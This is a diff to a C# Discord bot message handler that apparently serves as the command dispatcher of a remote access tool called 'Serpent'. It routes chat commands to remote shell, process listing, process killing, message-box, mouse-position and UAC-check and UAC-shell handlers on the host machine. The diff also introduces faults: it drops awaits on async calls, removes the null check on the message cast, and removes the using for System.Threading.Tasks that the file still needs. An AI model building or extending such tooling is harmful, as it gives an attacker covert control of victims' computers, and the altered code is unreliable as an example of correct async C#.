@@ -1,77 +1,111 @@
 using System;
-using System.Threading.Tasks;
 using Commands;
 using Discord;
 using Discord.Webhook;
 using Discord.WebSocket;
 using Helper;
 
+
+
+
 namespace Events
 {
-    public static class Messaging
-    {
-        private static string Prefix = ";";
 
-        public static async Task MessageReceive(SocketMessage msg)
-        {
-            if (!(msg is SocketUserMessage message) || message.Author.IsBot)
-                return;
+    
+    
 
-            if (!message.Content.StartsWith(Prefix))
-                return;
+    public static class Messaging {
+    private static string Prefix = ";";
 
-            string[] fullCommand = message.Content.Substring(Prefix.Length).Split(" ");
-            string commandName = fullCommand[0];
-            string jointArgs = string.Join(" ", fullCommand[1..]);
+    
+    public static async Task MessageReceive(SocketMessage Msg) {
 
-            switch (commandName.ToLower())
-            {
+        SocketUserMessage? Message = Msg as SocketUserMessage;
+        
+        if (Message.Author.IsBot) return;
+        if (Message.Content.StartsWith(Prefix)) {
+            string[] FullCommand = Message.Content[Prefix.Length..].Split(" ");
+            string CommandName = FullCommand[0];
+            
+            string JointArgs = string.IsNullOrEmpty(string.Join(" ",FullCommand[1..])) ? "None" : string.Join(" ",FullCommand[1..]);
+
+            switch (CommandName.ToLower()) {
+
                 case "help":
-                    await Commands.HelpCmd.Run(message, fullCommand[1..]);
-                    break;
 
+                Commands.HelpCmd.Run(Message,FullCommand[1..]);
+                break;
+
+                
                 case "shell":
-                    await Commands.Shell.Run(message, fullCommand[1..]);
-                    break;
+                Commands.Shell.Run(Message,FullCommand[1..]);
 
-                case "processes":
-                case "ps":
-                    await Commands.ZProcesses.Run(message, fullCommand[1..]);
-                    break;
+                
+                break;
+
+                case "processes" or "ps":
+
+                Commands.ZProcesses.Run(Message,FullCommand[1..]);
+
+                break;
+
 
                 case "psinfo":
-                    await Commands.PsInfo.Run(message, fullCommand[1..]);
-                    break;
+
+                Commands.PsInfo.Run(Message,FullCommand[1..]);
+
+
+                break;
 
                 case "crash":
-                    // await Commands.Crash.Run(message, fullCommand[1..]);
-                    break;
+               // Commands.Crash.Run(Message,FullCommand[1..]);
+
+                break;
 
                 case "msgbox":
-                    await Commands.Messagebox.Run(message, fullCommand[1..]);
-                    break;
+
+                Commands.Messagebox.Run(Message,FullCommand[1..]);
+                break;
 
                 case "mousepos":
-                    await Commands.CPos.Run(message, fullCommand[1..]);
-                    break;
+                Commands.CPos.Run(Message,FullCommand[1..]);
+
+                break;
 
                 case "kill":
-                    await Commands.Kill.Run(message, fullCommand[1..]);
-                    break;
+
+                Commands.Kill.Run(Message,FullCommand[1..]);
+                break;
 
                 case "uaccheck":
-                    await Commands.UACCheck.Run(message, fullCommand[1..]);
-                    break;
+                Commands.UACCheck.Run(Message,FullCommand[1..]);
+                break;
 
                 case "uacshell":
-                    await Commands.UACShell.Run(message, fullCommand[1..]);
-                    break;
+                Commands.UACShell.Run(Message,FullCommand[1..]);
+                break;
+
+                
 
                 default:
-                    Embed embed = new SerpentEmbed().GetEmbed(SerpentEmbeds.Error, "Invalid Command!", $"Command: ``{commandName}`` Not Found.");
-                    await message.Channel.SendMessageAsync(embed: embed);
-                    break;
+
+                Embed Embed = new SerpentEmbed().GetEmbed(SerpentEmbeds.Error,"Invalid Command!" , $"Command : ``{CommandName}`` Not Found.");
+                await Message.Channel.SendMessageAsync(embed : Embed);
+                break;
             }
+            
+            
         }
+        
     }
+
+
+
+  
+    
+
+
+};
+
+    
 }
